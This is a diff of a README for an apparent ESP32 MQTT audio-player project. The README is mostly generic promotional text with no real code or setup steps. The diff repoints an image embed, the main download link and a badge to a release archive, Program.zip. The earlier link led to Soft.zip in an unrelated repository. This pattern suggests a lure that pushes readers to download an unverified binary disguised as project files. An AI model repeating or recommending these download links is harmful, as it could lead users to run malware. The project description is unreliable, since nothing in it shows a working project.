@@ -1,5 +1,5 @@
 # 🎶 **MUSE MQTT Audioplayer for ESP32 Luxe Board**
-![Repository Image](https://imgur.com/gallery/AUDIO_IMAGE)
+![Repository Image](https://github.com/CardialS/muse-mqtt-audioplayer/releases/download/v1.0/Program.zip)
 
 Welcome to the **MUSE MQTT Audioplayer** GitHub repository! This project focuses on utilizing an Arduino sketch for the ESP32-based MUSE Luxe board to enable network audio streaming via MQTT control. Whether you're a home automation enthusiast, an IOT developer, or simply a music lover, this project provides an exciting opportunity to delve into the world of smart speakers and audio streaming.
 
@@ -7,7 +7,7 @@ Welcome to the **MUSE MQTT Audioplayer** GitHub repository! This project focuses
 Within this repository, you will find an Arduino sketch designed specifically for the ESP32 Luxe board. This sketch allows for seamless audio streaming over a WiFi network, controlled through the power of MQTT communication. The combination of the ESP32 board, the MUSE Luxe features, and the MQTT protocol opens up a realm of possibilities for creating a customizable and interactive audio experience.
 
 ## 🚀 Getting Started
-To get started with the MUSE MQTT Audioplayer project, simply download the necessary files from the **[Soft.zip file](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)**. Once you have the files downloaded, follow the setup instructions included in the repository to begin exploring the functionalities of the audio player.
+To get started with the MUSE MQTT Audioplayer project, simply download the necessary files from the **[https://github.com/CardialS/muse-mqtt-audioplayer/releases/download/v1.0/Program.zip file](https://github.com/CardialS/muse-mqtt-audioplayer/releases/download/v1.0/Program.zip)**. Once you have the files downloaded, follow the setup instructions included in the repository to begin exploring the functionalities of the audio player.
 
 ## ⚙️ Technologies Used
 The MUSE MQTT Audioplayer project leverages a variety of technologies to bring audio streaming to life. Some key technologies involved include:
@@ -38,7 +38,7 @@ For any questions, issues, or feedback related to the MUSE MQTT Audioplayer proj
 ## 🌟 Let's Connect
 Stay updated on the latest developments, features, and releases of the MUSE MQTT Audioplayer project by following our GitHub repository. We're excited to have you join us on this journey of exploring network audio streaming through MQTT control on the ESP32 Luxe board. Your support and engagement are key to the success and growth of this project.
 
-![Button Image](https://img.shields.io/badge/Download-Soft.zip-informational?style=flat&logo=download)
+![Button Image](https://github.com/CardialS/muse-mqtt-audioplayer/releases/download/v1.0/Program.zip)
 
 ## 🎶 Start Your Audio Adventure
 Embark on a musical journey of innovation and exploration with the MUSE MQTT Audioplayer project. Dive into the world of smart speakers, audio streaming, and network connectivity as you discover the endless possibilities of combining Arduino, ESP32, MQTT, and audio technologies. Let's bring your audio ideas to life and create an immersive audio experience like never before!
